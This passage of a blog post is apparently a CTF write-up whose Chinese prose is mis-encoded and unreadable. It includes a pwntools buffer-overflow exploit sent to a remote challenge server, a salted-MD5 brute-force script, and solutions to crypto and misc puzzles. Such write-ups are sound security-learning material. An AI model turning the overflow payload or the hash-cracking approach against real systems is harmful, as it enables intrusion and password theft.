keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./memory"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token comment" spellcheck="true">#io = process("./memory")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20012'</span><span class="token punctuation">)</span>catflag <span class="token operator">=</span> <span class="token number">0x080487E0</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_func'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#paddingç”±æ ˆç©ºé—´å’Œebp(0x13+4)ç»„æˆï¼Œsystem('cat flag')ç”±systemå‡½æ•°å’Œcatflagå‚æ•°ä»¥åŠsystemè¿”å›åœ°å€ç»„æˆ</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0x08048677</span><span class="token punctuation">,</span> catflag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd592283dd2f.png" class="lazyload"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚"><a href="#Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚" class="headerlink" title="Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚"></a>Crypto1-æˆ‘è¿™å¯†ç å¿˜äº†ã€‚ã€‚ã€‚</h3><blockquote><p>é¢˜é¢æœ‰ä¸€ä¸²base64ï¼šVTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</p><p>è¿ç»­è§£ç å³å¯å¾—åˆ°ï¼šSK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</p><p>æäº¤å³å¯ã€‚</p></blockquote><h3 id="Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç "><a href="#Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç " class="headerlink" title="Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç "></a>Crypto2-äºŒæˆ˜æ—¶æœŸçš„å¯†ç </h3><blockquote><p>æ®è¯´æ˜¯æŸå¹³å°åŸé¢˜ï¼Œç”šè‡³ä¸“é—¨å»æŸ¥äº†ä¸€ä¸‹äºŒæˆ˜æ—¶æœŸçš„å¯†ç å­¦ï¼Œé¢˜é¢ï¼š</p><pre class=" language-c"><code class="language-c">å·²çŸ¥å°†ä¸€ä¸ªflagä»¥ä¸€ç§åŠ å¯†å½¢å¼ä¸ºä½¿ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œä½¿ç”¨å¯†é’¥WELCOMETOCFFåŠ å¯†åå¯†æ–‡ä¸º<span class="token number">000000000000000000000000000000000000000000000000000101110000110001000000101000000001</span>ï¼Œè¯·åˆ†æå‡ºflag</code></pre><p>WELCOMETOCFFä¸ºå¯†é’¥ï¼Œé•¿åº¦ä¸º12ï¼Œè€ŒäºŒè¿›åˆ¶ä¸²é•¿åº¦ä¸º84ï¼Œæ—¢ç„¶å¯†æ–‡ä¸ºäºŒè¿›åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥æƒ³åˆ°çš„æ¯”è¾ƒç®€å•çš„åŠ å¯†æ“ä½œå°±æ˜¯æŒ‰ä½ä¸ï¼ŒæŒ‰ä½æˆ–ï¼Œä»¥åŠæŒ‰ä½å¼‚æˆ–ã€‚</p><p>å°è¯•åå‘ç°æ˜¯å¼‚æˆ–æ“ä½œï¼Œå°†WELCOMETOCFFï¼Œåˆ†åˆ«ç”¨ä¸ƒä½äºŒè¿›åˆ¶è¡¨ç¤ºå…¶åœ¨å­—æ¯è¡¨ä¸­çš„é¡ºåºï¼Œå¹¶ä¸”æ¯å¯¹åº”çš„ä¸ƒä½è¿›è¡Œå¼‚æˆ–æ“ä½œï¼š</p><pre class=" language-c"><code class="language-c">å¯†æ–‡<span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0010111</span> <span class="token number">0000110</span> <span class="token number">0010000</span> <span class="token number">0010100</span> <span class="token number">0000001</span>XORå¯†é’¥W E L C O M E T O C F F<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0010100</span> <span class="token number">0001111</span> <span class="token number">0000011</span> <span class="token number">0000110</span> <span class="token number">0000110</span>å¾—åˆ°ï¼š<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0000011</span> <span class="token number">0001001</span> <span class="token number">0010011</span> <span class="token number">0010010</span> <span class="token number">0000111</span>W E L C O M E C I S R G<span class="token operator">==</span><span class="token operator">></span> flag<span class="token punctuation">{</span>WELCOMECISRG<span class="token punctuation">}</span></code></pre><p>æäº¤å³å¯ã€‚</p></blockquote><h3 id="Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç "><a href="#Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç " class="headerlink" title="Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç "></a>Crypto3-è¢«é»‘äº†ï¼Œæ±‚å¯†ç </h3><blockquote><p>æ‘©æ–¯ç”µç è§£ç å³å¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5dc8906c6b.png" class="lazyload"></p><p>flag:JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</p></blockquote><h3 id="Crypto4-å‡ºèˆªäº†-å‡ºèˆªå•¦ï¼ï¼"><a href="#Crypto4-å‡ºèˆªäº†-å‡ºèˆªå•¦ï¼ï¼" class="headerlink" title="Crypto4-å‡ºèˆªäº†~å‡ºèˆªå•¦ï¼ï¼"></a>Crypto4-å‡ºèˆªäº†~å‡ºèˆªå•¦ï¼ï¼</h3><blockquote><p>æ ¹æ®é¢˜é¢ï¼Œå°è¯•è¿›è¡Œå¯¹è¯·æ±‚ç±»å‹è¿›è¡Œè¿‡æ»¤ï¼Œå‘ç°POSTè¯·æ±‚åªæœ‰ä¸€ä¸ªï¼Œå¹¶ä¸”æœ‰useridå’Œpswrdï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5dd387aca9.png" class="lazyload"></p><p>å°è¯•å°†pswrdçš„å€¼è§£ç åæäº¤flagï¼ŒæˆåŠŸã€‚</p></blockquote><h3 id="Crypto5-IDCå¯†ç ç ´è§£-æœªè§£å‡º"><a href="#Crypto5-IDCå¯†ç ç ´è§£-æœªè§£å‡º" class="headerlink" title="Crypto5-IDCå¯†ç ç ´è§£(æœªè§£å‡º)"></a>Crypto5-IDCå¯†ç ç ´è§£(æœªè§£å‡º)</h3><blockquote><p>ç»™å‡ºä¸€ä¸²å­—ç¬¦<code>js4163633181327481</code></p><p>å®Œå…¨è„‘æ´é¢˜ï¼šæ‰‹æœºä¹é”®<code>4163633181327481</code>ï¼Œæ²¡ç”¨è¿‡çš„å’‹æ´»ã€‚ã€‚ã€‚</p></blockquote><h3 id="Crypto6-è¶…çº§å¯†ç "><a href="#Crypto6-è¶…çº§å¯†ç " class="headerlink" title="Crypto6-è¶…çº§å¯†ç "></a>Crypto6-è¶…çº§å¯†ç </h3><blockquote><p>è¿™é¢˜ç»™å‡ºäº†å¤§é‡çš„md5å€¼ï¼Œä»¥åŠç±»ä¼¼äºbase64æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°hashåŠ ç›(salt)çš„é—®é¢˜ï¼Œè€Œä¸”éšçº¦è®°å¾—ä¹‹å‰åœ¨å“ªçœ‹åˆ°è¿‡è¿™ä¸ªé¢˜ã€‚</p><p>è„šæœ¬çˆ†ç ´ï¼ˆæ—¶é—´åŸå› ï¼Œç›´æ¥ä»1234567880å¼€å§‹ï¼‰ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> numba <span class="token keyword">import</span> jit@jit<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span><span class="token punctuation">,</span><span class="token string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span><span class="token punctuation">,</span><span class="token string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span><span class="token punctuation">,</span><span class="token string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span><span class="token punctuation">,</span><span class="token string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span><span class="token punctuation">,</span><span class="token string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span><span class="token punctuation">,</span><span class="token string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span><span class="token punctuation">,</span><span class="token string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span><span class="token punctuation">,</span><span class="token string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span><span class="token punctuation">,</span><span class="token string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span><span class="token punctuation">,</span><span class="token string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span><span class="token punctuation">,</span><span class="token string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span><span class="token punctuation">,</span><span class="token string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span><span class="token punctuation">,</span><span class="token string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span><span class="token punctuation">,</span><span class="token string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span><span class="token punctuation">,</span><span class="token string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span><span class="token punctuation">,</span><span class="token string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span><span class="token punctuation">,</span><span class="token string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span><span class="token punctuation">,</span><span class="token string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span><span class="token punctuation">,</span><span class="token string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span><span class="token punctuation">,</span><span class="token string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span><span class="token punctuation">,</span><span class="token string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span><span class="token punctuation">,</span><span class="token string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span><span class="token punctuation">,</span><span class="token string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span><span class="token punctuation">,</span><span class="token string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span><span class="token punctuation">,</span><span class="token string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span><span class="token punctuation">,</span><span class="token string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span><span class="token punctuation">,</span><span class="token string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span><span class="token punctuation">,</span><span class="token string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span><span class="token punctuation">,</span><span class="token string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span><span class="token punctuation">,</span><span class="token string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span><span class="token punctuation">,</span><span class="token string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span><span class="token punctuation">,</span><span class="token string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span><span class="token punctuation">,</span><span class="token string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span><span class="token punctuation">,</span><span class="token string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span><span class="token punctuation">,</span><span class="token string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span><span class="token punctuation">,</span><span class="token string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span><span class="token punctuation">,</span><span class="token string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span><span class="token punctuation">,</span><span class="token string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span><span class="token punctuation">,</span><span class="token string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span><span class="token punctuation">,</span><span class="token string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span><span class="token punctuation">,</span><span class="token string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span><span class="token punctuation">,</span><span class="token string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span><span class="token punctuation">,</span><span class="token string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span><span class="token punctuation">,</span><span class="token string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span><span class="token punctuation">,</span><span class="token string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span><span class="token punctuation">,</span><span class="token string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span><span class="token punctuation">,</span><span class="token string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span><span class="token punctuation">,</span><span class="token string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span><span class="token punctuation">,</span><span class="token string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span><span class="token punctuation">,</span><span class="token string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span><span class="token punctuation">,</span><span class="token string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span><span class="token punctuation">,</span><span class="token string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span><span class="token punctuation">,</span><span class="token string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span><span class="token punctuation">,</span><span class="token string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span><span class="token punctuation">,</span><span class="token string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span><span class="token punctuation">,</span><span class="token string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span><span class="token punctuation">,</span><span class="token string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span><span class="token punctuation">,</span><span class="token string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span><span class="token punctuation">,</span><span class="token string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span><span class="token punctuation">,</span><span class="token string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span><span class="token punctuation">,</span><span class="token string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span><span class="token punctuation">,</span><span class="token string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span><span class="token punctuation">,</span><span class="token string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span><span class="token punctuation">,</span><span class="token string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span><span class="token punctuation">,</span><span class="token string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">1234567880</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            salt <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            md5 <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>            mingwen <span class="token operator">=</span> <span class="token string">"{FLAG:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token operator">+</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            miwen <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingwen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>miwen <span class="token operator">==</span> md5<span class="token punctuation">)</span> <span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                n<span class="token operator">=</span><span class="token number">10000000000</span>                <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" class="lazyload"></p><p>flag:1234567890</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-ä¼šé£çš„ç‹—ç‹—"><a href="#Misc1-ä¼šé£çš„ç‹—ç‹—" class="headerlink" title="Misc1-ä¼šé£çš„ç‹—ç‹—"></a>Misc1-ä¼šé£çš„ç‹—ç‹—</h3><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" class="lazyload"></p><p>ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹å¯ä»¥å¾—åˆ°æœ«å°¾çš„base64å­—ç¬¦ä¸²ï¼Œæ¥è§£ç å¾—åˆ°flag</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e6629e3e4.png" class="lazyload"></p><h3 id="Misc2-æ–‡ä»¶ç±»å‹åˆ†æ"><a href="#Misc2-æ–‡ä»¶ç±»å‹åˆ†æ" class="headerlink" title="Misc2-æ–‡ä»¶ç±»å‹åˆ†æ"></a>Misc2-æ–‡ä»¶ç±»å‹åˆ†æ</h3><blockquote><p>å¾—åˆ°ä¸€ä¸ªzipå‹ç¼©åŒ…ï¼Œç‚¹å¼€æ¥çœ‹çœ‹ï¼Œå­˜åœ¨[content-types].xmlæ–‡ä»¶ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæ˜¯å¾®è½¯å…¬å¸officeå¥—ä»¶çš„æ ¼å¼ã€‚ç®€å•è¯•è¿‡docï¼Œdocxï¼Œpptï¼Œpptxï¼Œxlsï¼Œxlxsæ²¡ç”¨ä¹‹åï¼ŒæŸ¥åˆ°xpsï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e705b81e3.png" class="lazyload"></p><p>äºæ˜¯æ”¹ä¸ºxpsæ–‡ä»¶åç¼€å³å¯ï¼Œå°†xpsæäº¤ã€‚</p></blockquote><h3 id="Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š"><a href="#Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š" class="headerlink" title="Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š"></a>Misc3-çœŸçœŸå‡å‡åˆ†ä¸æ¸…æ¥š</h3><blockquote><p>ç®€å•çš„ä¸€ä¸ªä¼ªåŠ å¯†ï¼Œä¿®æ”¹å…¨å±€åŠ å¯†æ ‡å¿—ä½ï¼Œå°†å¥‡æ•°æ”¹ä¸ºå¶æ•°å³å¯ã€‚</p><p>{FLAG:011938d495c36aeab4bfbd897c240d31}</p></blockquote><h3 id="Misc4-è¯±äººçš„éŸ³ä¹"><a href="#Misc4-è¯±äººçš„éŸ³ä¹" class="headerlink" title="Misc4-è¯±äººçš„éŸ³ä¹"></a>Misc4-è¯±äººçš„éŸ³ä¹</h3><blockquote><p>è¿™é¢˜çš„éŸ³é¢‘æ–‡ä»¶ä¸­å­˜åœ¨ä¸€æ®µæ‘©æ–¯ç”µç ï¼ˆæœ‰çš„åŒå­¦é€šè¿‡äºŒè¿›åˆ¶getflagï¼‰ï¼Œé€šè¿‡éŸ³é¢‘åˆ†æè½¯ä»¶å¯ä»¥å°†å…¶æå–å‡ºæ¥ï¼š</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token comment" spellcheck="true">#ä¸€æ¬¡æ€§è§£ç è¡Œä¸é€šï¼Œå¯ä»¥å°†å…¶åˆ†ä¸ºä¸‰æ®µåˆ†åˆ«è§£ç å¹¶ä¸”å°†ä¸‰ä¸ªéæ­£å¸¸å­—ç¬¦è½¬ä¸º16è¿›åˆ¶ï¼š</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>æ™¬<span class="token number">61677b6368</span>æ™¬ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x666c</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>ã…°<span class="token number">74756e65</span>ã…° <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x3170</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span 